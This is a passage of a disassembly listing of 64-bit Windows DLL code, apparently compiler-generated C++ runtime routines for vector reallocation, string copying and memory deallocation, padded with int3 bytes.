   180002bdc:	48 83 e2 f0          	and    $0xfffffffffffffff0,%rdx
   180002be0:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180002be7:	72 18                	jb     0x180002c01
   180002be9:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   180002bed:	48 83 c2 27          	add    $0x27,%rdx
   180002bf1:	48 2b c8             	sub    %rax,%rcx
   180002bf4:	48 83 e9 08          	sub    $0x8,%rcx
   180002bf8:	48 83 f9 1f          	cmp    $0x1f,%rcx
   180002bfc:	77 38                	ja     0x180002c36
   180002bfe:	48 8b c8             	mov    %rax,%rcx
   180002c01:	e8 1e 1d 00 00       	call   0x180004924
   180002c06:	48 89 1e             	mov    %rbx,(%rsi)
   180002c09:	48 8d 0c 1f          	lea    (%rdi,%rbx,1),%rcx
   180002c0d:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   180002c12:	49 8b c6             	mov    %r14,%rax
   180002c15:	48 c1 e5 04          	shl    $0x4,%rbp
   180002c19:	48 03 eb             	add    %rbx,%rbp
   180002c1c:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   180002c21:	48 89 6e 08          	mov    %rbp,0x8(%rsi)
   180002c25:	48 89 4e 10          	mov    %rcx,0x10(%rsi)
   180002c29:	48 83 c4 30          	add    $0x30,%rsp
   180002c2d:	41 5f                	pop    %r15
   180002c2f:	41 5e                	pop    %r14
   180002c31:	41 5c                	pop    %r12
   180002c33:	5e                   	pop    %rsi
   180002c34:	5d                   	pop    %rbp
   180002c35:	c3                   	ret
   180002c36:	45 33 c9             	xor    %r9d,%r9d
   180002c39:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   180002c40:	00 00 
   180002c42:	45 33 c0             	xor    %r8d,%r8d
   180002c45:	33 d2                	xor    %edx,%edx
   180002c47:	33 c9                	xor    %ecx,%ecx
   180002c49:	ff 15 f1 35 00 00    	call   *0x35f1(%rip)        # 0x180006240
   180002c4f:	cc                   	int3
   180002c50:	e8 5b 06 00 00       	call   0x1800032b0
   180002c55:	cc                   	int3
   180002c56:	e8 c5 e6 ff ff       	call   0x180001320
   180002c5b:	cc                   	int3
   180002c5c:	cc                   	int3
   180002c5d:	cc                   	int3
   180002c5e:	cc                   	int3
   180002c5f:	cc                   	int3
   180002c60:	40 55                	rex push %rbp
   180002c62:	56                   	push   %rsi
   180002c63:	41 57                	push   %r15
   180002c65:	48 83 ec 30          	sub    $0x30,%rsp
   180002c69:	48 8b 05 08 8b 00 00 	mov    0x8b08(%rip),%rax        # 0x18000b778
   180002c70:	48 8b ea             	mov    %rdx,%rbp
   180002c73:	48 8b 15 f6 8a 00 00 	mov    0x8af6(%rip),%rdx        # 0x18000b770
   180002c7a:	48 8b f5             	mov    %rbp,%rsi
   180002c7d:	48 2b f2             	sub    %rdx,%rsi
   180002c80:	48 2b c2             	sub    %rdx,%rax
   180002c83:	4d 8b f8             	mov    %r8,%r15
   180002c86:	48 c1 fe 02          	sar    $0x2,%rsi
   180002c8a:	48 c1 f8 02          	sar    $0x2,%rax
   180002c8e:	49 b8 ff ff ff ff ff 	movabs $0x3fffffffffffffff,%r8
   180002c95:	ff ff 3f 
   180002c98:	49 3b c0             	cmp    %r8,%rax
   180002c9b:	0f 84 72 01 00 00    	je     0x180002e13
   180002ca1:	48 8b 0d d8 8a 00 00 	mov    0x8ad8(%rip),%rcx        # 0x18000b780
   180002ca8:	48 2b ca             	sub    %rdx,%rcx
   180002cab:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   180002cb0:	48 c1 f9 02          	sar    $0x2,%rcx
   180002cb4:	48 89 7c 24 60       	mov    %rdi,0x60(%rsp)
   180002cb9:	48 8b d1             	mov    %rcx,%rdx
   180002cbc:	48 d1 ea             	shr    $1,%rdx
   180002cbf:	4c 89 74 24 68       	mov    %r14,0x68(%rsp)
   180002cc4:	4c 8d 70 01          	lea    0x1(%rax),%r14
   180002cc8:	49 8b c0             	mov    %r8,%rax
   180002ccb:	48 2b c2             	sub    %rdx,%rax
   180002cce:	48 3b c8             	cmp    %rax,%rcx
   180002cd1:	0f 87 42 01 00 00    	ja     0x180002e19
   180002cd7:	48 8d 04 0a          	lea    (%rdx,%rcx,1),%rax
   180002cdb:	49 8b fe             	mov    %r14,%rdi
   180002cde:	49 3b c6             	cmp    %r14,%rax
   180002ce1:	48 0f 43 f8          	cmovae %rax,%rdi
   180002ce5:	49 3b f8             	cmp    %r8,%rdi
   180002ce8:	0f 87 2b 01 00 00    	ja     0x180002e19
   180002cee:	48 8d 3c bd 00 00 00 	lea    0x0(,%rdi,4),%rdi
   180002cf5:	00 
   180002cf6:	48 85 ff             	test   %rdi,%rdi
   180002cf9:	75 04                	jne    0x180002cff
   180002cfb:	33 db                	xor    %ebx,%ebx
   180002cfd:	eb 3d                	jmp    0x180002d3c
   180002cff:	48 81 ff 00 10 00 00 	cmp    $0x1000,%rdi
   180002d06:	72 29                	jb     0x180002d31
   180002d08:	48 8d 4f 27          	lea    0x27(%rdi),%rcx
   180002d0c:	48 3b cf             	cmp    %rdi,%rcx
   180002d0f:	0f 86 04 01 00 00    	jbe    0x180002e19
   180002d15:	e8 96 17 00 00       	call   0x1800044b0
   180002d1a:	48 85 c0             	test   %rax,%rax
   180002d1d:	0f 84 d6 00 00 00    	je     0x180002df9
   180002d23:	48 8d 58 27          	lea    0x27(%rax),%rbx
   180002d27:	48 83 e3 e0          	and    $0xffffffffffffffe0,%rbx
   180002d2b:	48 89 43 f8          	mov    %rax,-0x8(%rbx)
   180002d2f:	eb 0b                	jmp    0x180002d3c
   180002d31:	48 8b cf             	mov    %rdi,%rcx
   180002d34:	e8 77 17 00 00       	call   0x1800044b0
   180002d39:	48 8b d8             	mov    %rax,%rbx
   180002d3c:	41 8b 0f             	mov    (%r15),%ecx
   180002d3f:	48 8d 34 b3          	lea    (%rbx,%rsi,4),%rsi
   180002d43:	89 0e                	mov    %ecx,(%rsi)
   180002d45:	48 8b cb             	mov    %rbx,%rcx
   180002d48:	4c 8b 05 29 8a 00 00 	mov    0x8a29(%rip),%r8        # 0x18000b778
   180002d4f:	48 8b 15 1a 8a 00 00 	mov    0x8a1a(%rip),%rdx        # 0x18000b770
   180002d56:	49 3b e8             	cmp    %r8,%rbp
   180002d59:	75 05                	jne    0x180002d60
   180002d5b:	4c 2b c2             	sub    %rdx,%r8
   180002d5e:	eb 1c                	jmp    0x180002d7c
   180002d60:	4c 8b c5             	mov    %rbp,%r8
   180002d63:	4c 2b c2             	sub    %rdx,%r8
   180002d66:	e8 83 28 00 00       	call   0x1800055ee
   180002d6b:	4c 8b 05 06 8a 00 00 	mov    0x8a06(%rip),%r8        # 0x18000b778
   180002d72:	48 8d 4e 04          	lea    0x4(%rsi),%rcx
   180002d76:	4c 2b c5             	sub    %rbp,%r8
   180002d79:	48 8b d5             	mov    %rbp,%rdx
   180002d7c:	e8 6d 28 00 00       	call   0x1800055ee
   180002d81:	48 8b 0d e8 89 00 00 	mov    0x89e8(%rip),%rcx        # 0x18000b770
   180002d88:	48 85 c9             	test   %rcx,%rcx
   180002d8b:	74 34                	je     0x180002dc1
   180002d8d:	48 8b 15 ec 89 00 00 	mov    0x89ec(%rip),%rdx        # 0x18000b780
   180002d94:	48 2b d1             	sub    %rcx,%rdx
   180002d97:	48 83 e2 fc          	and    $0xfffffffffffffffc,%rdx
   180002d9b:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180002da2:	72 18                	jb     0x180002dbc
   180002da4:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   180002da8:	48 83 c2 27          	add    $0x27,%rdx
   180002dac:	48 2b c8             	sub    %rax,%rcx
   180002daf:	48 83 e9 08          	sub    $0x8,%rcx
   180002db3:	48 83 f9 1f          	cmp    $0x1f,%rcx
   180002db7:	77 40                	ja     0x180002df9
   180002db9:	48 8b c8             	mov    %rax,%rcx
   180002dbc:	e8 63 1b 00 00       	call   0x180004924
   180002dc1:	4a 8d 0c b3          	lea    (%rbx,%r14,4),%rcx
   180002dc5:	48 89 1d a4 89 00 00 	mov    %rbx,0x89a4(%rip)        # 0x18000b770
   180002dcc:	4c 8b 74 24 68       	mov    0x68(%rsp),%r14
   180002dd1:	48 8b c6             	mov    %rsi,%rax
   180002dd4:	48 89 0d 9d 89 00 00 	mov    %rcx,0x899d(%rip)        # 0x18000b778
   180002ddb:	48 8d 0c 1f          	lea    (%rdi,%rbx,1),%rcx
   180002ddf:	48 8b 7c 24 60       	mov    0x60(%rsp),%rdi
   180002de4:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   180002de9:	48 89 0d 90 89 00 00 	mov    %rcx,0x8990(%rip)        # 0x18000b780
   180002df0:	48 83 c4 30          	add    $0x30,%rsp
   180002df4:	41 5f                	pop    %r15
   180002df6:	5e                   	pop    %rsi
   180002df7:	5d                   	pop    %rbp
   180002df8:	c3                   	ret
   180002df9:	45 33 c9             	xor    %r9d,%r9d
   180002dfc:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   180002e03:	00 00 
   180002e05:	45 33 c0             	xor    %r8d,%r8d
   180002e08:	33 d2                	xor    %edx,%edx
   180002e0a:	33 c9                	xor    %ecx,%ecx
   180002e0c:	ff 15 2e 34 00 00    	call   *0x342e(%rip)        # 0x180006240
   180002e12:	cc                   	int3
   180002e13:	e8 98 04 00 00       	call   0x1800032b0
   180002e18:	cc                   	int3
   180002e19:	e8 02 e5 ff ff       	call   0x180001320
   180002e1e:	cc                   	int3
   180002e1f:	cc                   	int3
   180002e20:	48 8b c4             	mov    %rsp,%rax
   180002e23:	48 89 58 10          	mov    %rbx,0x10(%rax)
   180002e27:	48 89 68 18          	mov    %rbp,0x18(%rax)
   180002e2b:	48 89 70 20          	mov    %rsi,0x20(%rax)
   180002e2f:	57                   	push   %rdi
   180002e30:	41 54                	push   %r12
   180002e32:	41 55                	push   %r13
   180002e34:	41 56                	push   %r14
   180002e36:	41 57                	push   %r15
   180002e38:	48 83 ec 50          	sub    $0x50,%rsp
   180002e3c:	49 8b d8             	mov    %r8,%rbx
   180002e3f:	4c 8b fa             	mov    %rdx,%r15
   180002e42:	48 8b f9             	mov    %rcx,%rdi
   180002e45:	0f 57 c0             	xorps  %xmm0,%xmm0
   180002e48:	0f 11 40 b8          	movups %xmm0,-0x48(%rax)
   180002e4c:	48 89 58 b8          	mov    %rbx,-0x48(%rax)
   180002e50:	48 89 58 c0          	mov    %rbx,-0x40(%rax)
   180002e54:	4c 89 48 c8          	mov    %r9,-0x38(%rax)
   180002e58:	48 3b ca             	cmp    %rdx,%rcx
   180002e5b:	0f 84 17 01 00 00    	je     0x180002f78
   180002e61:	45 33 e4             	xor    %r12d,%r12d
   180002e64:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   180002e6b:	ff ff 7f 
   180002e6e:	b9 0a 00 00 00       	mov    $0xa,%ecx
   180002e73:	49 bd fe ff ff ff ff 	movabs $0x7ffffffffffffffe,%r13
   180002e7a:	ff ff 7f 
   180002e7d:	0f 1f 00             	nopl   (%rax)
   180002e80:	0f 57 c0             	xorps  %xmm0,%xmm0
   180002e83:	0f 11 03             	movups %xmm0,(%rbx)
   180002e86:	4c 89 63 10          	mov    %r12,0x10(%rbx)
   180002e8a:	4c 89 63 18          	mov    %r12,0x18(%rbx)
   180002e8e:	4c 8b f7             	mov    %rdi,%r14
   180002e91:	48 83 7f 18 07       	cmpq   $0x7,0x18(%rdi)
   180002e96:	76 03                	jbe    0x180002e9b
   180002e98:	4c 8b 37             	mov    (%rdi),%r14
   180002e9b:	48 8b 6f 10          	mov    0x10(%rdi),%rbp
   180002e9f:	49 3b ed             	cmp    %r13,%rbp
   180002ea2:	0f 87 18 01 00 00    	ja     0x180002fc0
   180002ea8:	48 83 fd 07          	cmp    $0x7,%rbp
   180002eac:	77 18                	ja     0x180002ec6
   180002eae:	48 89 6b 10          	mov    %rbp,0x10(%rbx)
   180002eb2:	48 c7 43 18 07 00 00 	movq   $0x7,0x18(%rbx)
   180002eb9:	00 
   180002eba:	41 0f 10 06          	movups (%r14),%xmm0
   180002ebe:	0f 11 03             	movups %xmm0,(%rbx)
   180002ec1:	e9 9c 00 00 00       	jmp    0x180002f62
   180002ec6:	48 8b f5             	mov    %rbp,%rsi
   180002ec9:	48 83 ce 07          	or     $0x7,%rsi
   180002ecd:	49 3b f5             	cmp    %r13,%rsi
   180002ed0:	76 3f                	jbe    0x180002f11
   180002ed2:	49 8b f5             	mov    %r13,%rsi
   180002ed5:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
   180002ed9:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   180002ee0:	72 4e                	jb     0x180002f30
   180002ee2:	48 8d 41 27          	lea    0x27(%rcx),%rax
   180002ee6:	48 3b c1             	cmp    %rcx,%rax
   180002ee9:	0f 86 cb 00 00 00    	jbe    0x180002fba
   180002eef:	48 8b c8             	mov    %rax,%rcx
   180002ef2:	e8 b9 15 00 00       	call   0x1800044b0
   180002ef7:	48 8b c8             	mov    %rax,%rcx
   180002efa:	48 85 c0             	test   %rax,%rax
   180002efd:	0f 84 a1 00 00 00    	je     0x180002fa4
   180002f03:	48 83 c0 27          	add    $0x27,%rax
   180002f07:	48 83 e0 e0          	and    $0xffffffffffffffe0,%rax
   180002f0b:	48 89 48 f8          	mov    %rcx,-0x8(%rax)
   180002f0f:	eb 24                	jmp    0x180002f35
   180002f11:	48 83 fe 0a          	cmp    $0xa,%rsi
   180002f15:	48 0f 42 f1          	cmovb  %rcx,%rsi
   180002f19:	48 8d 4e 01          	lea    0x1(%rsi),%rcx
   180002f1d:	48 3b c8             	cmp    %rax,%rcx
   180002f20:	0f 87 94 00 00 00    	ja     0x180002fba
   180002f26:	48 03 c9             	add    %rcx,%rcx
   180002f29:	75 ae                	jne    0x180002ed9
   180002f2b:	49 8b c4             	mov    %r12,%rax
   180002f2e:	eb 05                	jmp    0x180002f35
   180002f30:	e8 7b 15 00 00       	call   0x1800044b0
   180002f35:	48 89 03             	mov    %rax,(%rbx)
   180002f38:	48 89 6b 10          	mov    %rbp,0x10(%rbx)
   180002f3c:	48 89 73 18          	mov    %rsi,0x18(%rbx)
   180002f40:	4c 8d 04 6d 02 00 00 	lea    0x2(,%rbp,2),%r8
   180002f47:	00 
   180002f48:	49 8b d6             	mov    %r14,%rdx
   180002f4b:	48 8b c8             	mov    %rax,%rcx
   180002f4e:	e8 29 25 00 00       	call   0x18000547c
   180002f53:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   180002f5a:	ff ff 7f 
   180002f5d:	b9 0a 00 00 00       	mov    $0xa,%ecx
   180002f62:	48 83 c3 20          	add    $0x20,%rbx
   180002f66:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   180002f6b:	48 83 c7 20          	add    $0x20,%rdi
   180002f6f:	49 3b ff             	cmp    %r15,%rdi
   180002f72:	0f 85 08 ff ff ff    	jne    0x180002e80
   180002f78:	48 8b d3             	mov    %rbx,%rdx
   180002f7b:	48 8b cb             	mov    %rbx,%rcx
   180002f7e:	e8 ed 01 00 00       	call   0x180003170
   180002f83:	48 8b c3             	mov    %rbx,%rax
   180002f86:	4c 8d 5c 24 50       	lea    0x50(%rsp),%r11
   180002f8b:	49 8b 5b 38          	mov    0x38(%r11),%rbx
   180002f8f:	49 8b 6b 40          	mov    0x40(%r11),%rbp
   180002f93:	49 8b 73 48          	mov    0x48(%r11),%rsi
   180002f97:	49 8b e3             	mov    %r11,%rsp
   180002f9a:	41 5f                	pop    %r15
   180002f9c:	41 5e                	pop    %r14
   180002f9e:	41 5d                	pop    %r13
   180002fa0:	41 5c                	pop    %r12
   180002fa2:	5f                   	pop    %rdi
   180002fa3:	c3                   	ret
   180002fa4:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   180002fa9:	45 33 c9             	xor    %r9d,%r9d
   180002fac:	45 33 c0             	xor    %r8d,%r8d
   180002faf:	33 d2                	xor    %edx,%edx
   180002fb1:	33 c9                	xor    %ecx,%ecx
   180002fb3:	ff 15 87 32 00 00    	call   *0x3287(%rip)        # 0x180006240
   180002fb9:	cc                   	int3
   180002fba:	e8 61 e3 ff ff       	call   0x180001320
   180002fbf:	cc                   	int3
   180002fc0:	e8 fb e3 ff ff       	call   0x1800013c0
   180002fc5:	cc                   	int3
   180002fc6:	cc                   	int3
   180002fc7:	cc                   	int3
   180002fc8:	cc                   	int3
   180002fc9:	cc                   	int3
   180002fca:	cc                   	int3
   180002fcb:	cc                   	int3
   180002fcc:	cc                   	int3
   180002fcd:	cc                   	int3
   180002fce:	cc                   	int3
   180002fcf:	cc                   	int3
   180002fd0:	48 8b c4             	mov    %rsp,%rax
   180002fd3:	48 89 58 10          	mov    %rbx,0x10(%rax)
   180002fd7:	48 89 68 18          	mov    %rbp,0x18(%rax)
   180002fdb:	48 89 70 20          	mov    %rsi,0x20(%rax)
   180002fdf:	57                   	push   %rdi
   180002fe0:	41 54                	push   %r12
   180002fe2:	41 55                	push   %r13
   180002fe4:	41 56                	push   %r14
   180002fe6:	41 57                	push   %r15
   180002fe8:	48 83 ec 50          	sub    $0x50,%rsp
   180002fec:	49 8b d8             	mov    %r8,%rbx
   180002fef:	4c 8b fa             	mov    %rdx,%r15
   180002ff2:	48 8b f1             	mov    %rcx,%rsi
   180002ff5:	0f 57 c0             	xorps  %xmm0,%xmm0
   180002ff8:	0f 11 40 b8          	movups %xmm0,-0x48(%rax)
   180002ffc:	48 89 58 b8          	mov    %rbx,-0x48(%rax)
   180003000:	48 89 58 c0          	mov    %rbx,-0x40(%rax)
   180003004:	4c 89 48 c8          	mov    %r9,-0x38(%rax)
   180003008:	48 3b ca             	cmp    %rdx,%rcx
   18000300b:	0f 84 08 01 00 00    	je     0x180003119
   180003011:	45 33 e4             	xor    %r12d,%r12d
   180003014:	48 b8 00 00 00 00 00 	movabs $0x8000000000000000,%rax
   18000301b:	00 00 80 
   18000301e:	b9 16 00 00 00       	mov    $0x16,%ecx
   180003023:	49 bd ff ff ff ff ff 	movabs $0x7fffffffffffffff,%r13
   18000302a:	ff ff 7f 
   18000302d:	0f 1f 00             	nopl   (%rax)
   180003030:	0f 57 c0             	xorps  %xmm0,%xmm0
   180003033:	0f 11 03             	movups %xmm0,(%rbx)
   180003036:	4c 89 63 10          	mov    %r12,0x10(%rbx)
   18000303a:	4c 89 63 18          	mov    %r12,0x18(%rbx)
   18000303e:	4c 8b f6             	mov    %rsi,%r14
   180003041:	48 83 7e 18 0f       	cmpq   $0xf,0x18(%rsi)
   180003046:	76 03                	jbe    0x18000304b
   180003048:	4c 8b 36             	mov    (%rsi),%r14
   18000304b:	48 8b 6e 10          	mov    0x10(%rsi),%rbp
   18000304f:	49 3b ed             	cmp    %r13,%rbp
   180003052:	0f 87 09 01 00 00    	ja     0x180003161
   180003058:	48 83 fd 0f          	cmp    $0xf,%rbp
   18000305c:	77 18                	ja     0x180003076
   18000305e:	48 89 6b 10          	mov    %rbp,0x10(%rbx)
   180003062:	48 c7 43 18 0f 00 00 	movq   $0xf,0x18(%rbx)
   180003069:	00 
   18000306a:	41 0f 10 06          	movups (%r14),%xmm0
   18000306e:	0f 11 03             	movups %xmm0,(%rbx)
   180003071:	e9 8d 00 00 00       	jmp    0x180003103
   180003076:	48 8b fd             	mov    %rbp,%rdi
   180003079:	48 83 cf 0f          	or     $0xf,%rdi
   18000307d:	49 3b fd             	cmp    %r13,%rdi
   180003080:	76 09                	jbe    0x18000308b
   180003082:	49 8b fd             	mov    %r13,%rdi
   180003085:	48 83 c0 27          	add    $0x27,%rax
   180003089:	eb 2c                	jmp    0x1800030b7
   18000308b:	48 83 ff 16          	cmp    $0x16,%rdi
   18000308f:	48 0f 42 f9          	cmovb  %rcx,%rdi
   180003093:	48 8d 4f 01          	lea    0x1(%rdi),%rcx
   180003097:	48 85 c9             	test   %rcx,%rcx
   18000309a:	75 05                	jne    0x1800030a1
   18000309c:	49 8b c4             	mov    %r12,%rax
   18000309f:	eb 39                	jmp    0x1800030da
   1800030a1:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   1800030a8:	72 2b                	jb     0x1800030d5
   1800030aa:	48 8d 41 27          	lea    0x27(%rcx),%rax
   1800030ae:	48 3b c1             	cmp    %rcx,%rax
   1800030b1:	0f 86 a4 00 00 00    	jbe    0x18000315b
   1800030b7:	48 8b c8             	mov    %rax,%rcx
   1800030ba:	e8 f1 13 00 00       	call   0x1800044b0
   1800030bf:	48 8b c8             	mov    %rax,%rcx
   1800030c2:	48 85 c0             	test   %rax,%rax
   1800030c5:	74 7e                	je     0x180003145
   1800030c7:	48 83 c0 27          	add    $0x27,%rax
   1800030cb:	48 83 e0 e0          	and    $0xffffffffffffffe0,%rax
   1800030cf:	48 89 48 f8          	mov    %rcx,-0x8(%rax)
   1800030d3:	eb 05                	jmp    0x1800030da
   1800030d5:	e8 d6 13 00 00       	call   0x1800044b0
   1800030da:	48 89 03             	mov    %rax,(%rbx)
   1800030dd:	48 89 6b 10          	mov    %rbp,0x10(%rbx)
   1800030e1:	48 89 7b 18          	mov    %rdi,0x18(%rbx)
   1800030e5:	4c 8d 45 01          	lea    0x1(%rbp),%r8
   1800030e9:	49 8b d6             	mov    %r14,%rdx
   1800030ec:	48 8b c8             	mov    %rax,%rcx
   1800030ef:	e8 88 23 00 00       	call   0x18000547c
   1800030f4:	48 b8 00 00 00 00 00 	movabs $0x8000000000000000,%rax
   1800030fb:	00 00 80 
   1800030fe:	b9 16 00 00 00       	mov    $0x16,%ecx
   180003103:	48 83 c3 20          	add    $0x20,%rbx
   180003107:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   18000310c:	48 83 c6 20          	add    $0x20,%rsi
   180003110:	49 3b f7             	cmp    %r15,%rsi
   180003113:	0f 85 17 ff ff ff    	jne    0x180003030
   180003119:	48 8b d3             	mov    %rbx,%rdx
   18000311c:	48 8b cb             	mov    %rbx,%rcx
   18000311f:	e8 ec 00 00 00       	call   0x180003210
   180003124:	48 8b c3             	mov    %rbx,%rax
   180003127:	4c 8d 5c 24 50       	lea    0x50(%rsp),%r11
   18000312c:	49 8b 5b 38          	mov    0x38(%r11),%rbx
   180003130:	49 8b 6b 40          	mov    0x40(%r11),%rbp
   180003134:	49 8b 73 48          	mov    0x48(%r11),%rsi
   180003138:	49 8b e3             	mov    %r11,%rsp
   18000313b:	41 5f                	pop    %r15
   18000313d:	41 5e                	pop    %r14
   18000313f:	41 5d                	pop    %r13
   180003141:	41 5c                	pop    %r12
   180003143:	5f                   	pop    %rdi
   180003144:	c3                   	ret
   180003145:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   18000314a:	45 33 c9             	xor    %r9d,%r9d
   18000314d:	45 33 c0             	xor    %r8d,%r8d
   180003150:	33 d2                	xor    %edx,%edx
   180003152:	33 c9                	xor    %ecx,%ecx
   180003154:	ff 15 e6 30 00 00    	call   *0x30e6(%rip)        # 0x180006240
   18000315a:	cc                   	int3
   18000315b:	e8 c0 e1 ff ff       	call   0x180001320
   180003160:	cc                   	int3
   180003161:	e8 5a e2 ff ff       	call   0x1800013c0
   180003166:	cc                   	int3
   180003167:	cc                   	int3
   180003168:	cc                   	int3
   180003169:	cc                   	int3
   18000316a:	cc                   	int3
   18000316b:	cc                   	int3
   18000316c:	cc                   	int3
   18000316d:	cc                   	int3
   18000316e:	cc                   	int3
   18000316f:	cc                   	int3
   180003170:	48 3b ca             	cmp    %rdx,%rcx
   180003173:	74 7d                	je     0x1800031f2
   180003175:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   18000317a:	57                   	push   %rdi
   18000317b:	48 83 ec 30          	sub    $0x30,%rsp
   18000317f:	48 89 74 24 48       	mov    %rsi,0x48(%rsp)
   180003184:	48 8b fa             	mov    %rdx,%rdi
   180003187:	33 f6                	xor    %esi,%esi
   180003189:	48 8b d9             	mov    %rcx,%rbx
   18000318c:	0f 1f 40 00          	nopl   0x0(%rax)
   180003190:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   180003194:	48 83 fa 07          	cmp    $0x7,%rdx
   180003198:	76 31                	jbe    0x1800031cb
   18000319a:	48 8b 0b             	mov    (%rbx),%rcx
   18000319d:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   1800031a4:	00 
   1800031a5:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1800031ac:	72 18                	jb     0x1800031c6
   1800031ae:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   1800031b2:	48 83 c2 27          	add    $0x27,%rdx
   1800031b6:	48 2b c8             	sub    %rax,%rcx
   1800031b9:	48 83 e9 08          	sub    $0x8,%rcx
   1800031bd:	48 83 f9 1f          	cmp    $0x1f,%rcx
   1800031c1:	77 30                	ja     0x1800031f3
   1800031c3:	48 8b c8             	mov    %rax,%rcx
   1800031c6:	e8 59 17 00 00       	call   0x180004924
   1800031cb:	48 89 73 10          	mov    %rsi,0x10(%rbx)
   1800031cf:	48 c7 43 18 07 00 00 	movq   $0x7,0x18(%rbx)
   1800031d6:	00 
   1800031d7:	66 89 33             	mov    %si,(%rbx)
   1800031da:	48 83 c3 20          	add    $0x20,%rbx
   1800031de:	48 3b df             	cmp    %rdi,%rbx
   1800031e1:	75 ad                	jne    0x180003190
   1800031e3:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   1800031e8:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1800031ed:	48 83 c4 30          	add    $0x30,%rsp
   1800031f1:	5f                   	pop    %rdi
   1800031f2:	c3                   	ret
   1800031f3:	45 33 c9             	xor    %r9d,%r9d
   1800031f6:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1800031fb:	45 33 c0             	xor    %r8d,%r8d
   1800031fe:	33 d2                	xor    %edx,%edx
   180003200:	33 c9                	xor    %ecx,%ecx
   180003202:	ff 15 38 30 00 00    	call   *0x3038(%rip)        # 0x180006240
   180003208:	cc                   	int3
   180003209:	cc                   	int3
   18000320a:	cc                   	int3
   18000320b:	cc                   	int3
   18000320c:	cc                   	int3
   18000320d:	cc                   	int3
   18000320e:	cc                   	int3
   18000320f:	cc                   	int3
   180003210:	48 3b ca             	cmp    %rdx,%rcx
   180003213:	74 78                	je     0x18000328d
   180003215:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   18000321a:	57                   	push   %rdi
   18000321b:	48 83 ec 30          	sub    $0x30,%rsp
   18000321f:	48 89 74 24 48       	mov    %rsi,0x48(%rsp)
   180003224:	48 8b fa             	mov    %rdx,%rdi
   180003227:	33 f6                	xor    %esi,%esi
   180003229:	48 8b d9             	mov    %rcx,%rbx
   18000322c:	0f 1f 40 00          	nopl   0x0(%rax)
   180003230:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   180003234:	48 83 fa 0f          	cmp    $0xf,%rdx
   180003238:	76 2c                	jbe    0x180003266
   18000323a:	48 8b 0b             	mov    (%rbx),%rcx
   18000323d:	48 ff c2             	inc    %rdx
   180003240:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180003247:	72 18                	jb     0x180003261
   180003249:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   18000324d:	48 83 c2 27          	add    $0x27,%rdx
   180003251:	48 2b c8             	sub    %rax,%rcx
   180003254:	48 83 e9 08          	sub    $0x8,%rcx
   180003258:	48 83 f9 1f          	cmp    $0x1f,%rcx
   18000325c:	77 30                	ja     0x18000328e
   18000325e:	48 8b c8             	mov    %rax,%rcx
   180003261:	e8 be 16 00 00       	call   0x180004924
   180003266:	48 89 73 10          	mov    %rsi,0x10(%rbx)
   18000326a:	48 c7 43 18 0f 00 00 	movq   $0xf,0x18(%rbx)
   180003271:	00 
   180003272:	40 88 33             	mov    %sil,(%rbx)
   180003275:	48 83 c3 20          	add    $0x20,%rbx
   180003279:	48 3b df             	cmp    %rdi,%rbx
   18000327c:	75 b2                	jne    0x180003230
   18000327e:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   180003283:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   180003288:	48 83 c4 30          	add    $0x30,%rsp
   18000328c:	5f                   	pop    %rdi
   18000328d:	c3                   	ret
   18000328e:	45 33 c9             	xor    %r9d,%r9d
   180003291:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   180003296:	45 33 c0             	xor    %r8d,%r8d
   180003299:	33 d2                	xor    %edx,%edx
   18000329b:	33 c9                	xor    %ecx,%ecx
   18000329d:	ff 15 9d 2f 00 00    	call   *0x2f9d(%rip)        # 0x180006240
   1800032a3:	cc                   	int3
   1800032a4:	cc                   	int3
   1800032a5:	cc                   	int3
   1800032a6:	cc                   	int3
   1800032a7:	cc                   	int3
   1800032a8:	cc                   	int3
   1800032a9:	cc                   	int3
   1800032aa:	cc                   	int3
   1800032ab:	cc                   	int3
   1800032ac:	cc                   	int3
   1800032ad:	cc                   	int3
   1800032ae:	cc                   	int3
   1800032af:	cc                   	int3
   1800032b0:	48 83 ec 28          	sub    $0x28,%rsp
   1800032b4:	48 8d 0d d5 57 00 00 	lea    0x57d5(%rip),%rcx        # 0x180008a90
   1800032bb:	ff 15 5f 2e 00 00    	call   *0x2e5f(%rip)        # 0x180006120
   1800032c1:	cc                   	int3
   1800032c2:	cc                   	int3
   1800032c3:	cc                   	int3
   1800032c4:	cc                   	int3
   1800032c5:	cc                   	int3
   1800032c6:	cc                   	int3
   1800032c7:	cc                   	int3
   1800032c8:	cc                   	int3
   1800032c9:	cc                   	int3
   1800032ca:	cc                   	int3
   1800032cb:	cc                   	int3
   1800032cc:	cc                   	int3
   1800032cd:	cc                   	int3
